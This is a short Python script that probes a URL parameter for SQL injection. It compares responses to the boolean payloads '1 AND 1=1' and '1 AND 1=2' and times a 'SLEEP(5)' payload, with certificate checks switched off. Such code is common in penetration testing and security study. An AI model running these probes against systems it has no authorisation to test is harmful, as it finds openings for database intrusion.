import difflib
import statistics
import requests
import time


# -----------------------------
# Response Similarity Checker
# -----------------------------
def similarity(a, b):
    return difflib.SequenceMatcher(None, a, b).ratio()


# -----------------------------
# Baseline Response Time
# -----------------------------
def average_response_time(url, trials=3):
    times = []
    for _ in range(trials):
        start = time.time()
        try:
            requests.get(url, timeout=8, verify=False)
        except:
            pass
        times.append(time.time() - start)
    return statistics.mean(times)


# -----------------------------
# Boolean Injection Test
# -----------------------------
def boolean_test(url, param):

    true_payload = "1 AND 1=1"
    false_payload = "1 AND 1=2"

    try:
        true_res = requests.get(f"{url}?{param}={true_payload}", timeout=8, verify=False).text
        false_res = requests.get(f"{url}?{param}={false_payload}", timeout=8, verify=False).text
    except:
        return False

    sim = similarity(true_res, false_res)

    return sim < 0.95   # different responses


# -----------------------------
# Time Delay Verification
# -----------------------------
def time_test(url, param):

    baseline = average_response_time(url)

    payload = "1 AND SLEEP(5)"

    start = time.time()
    try:
        requests.get(f"{url}?{param}={payload}", timeout=12, verify=False)
    except:
        return False

    delay = time.time() - start

    return delay > baseline + 4
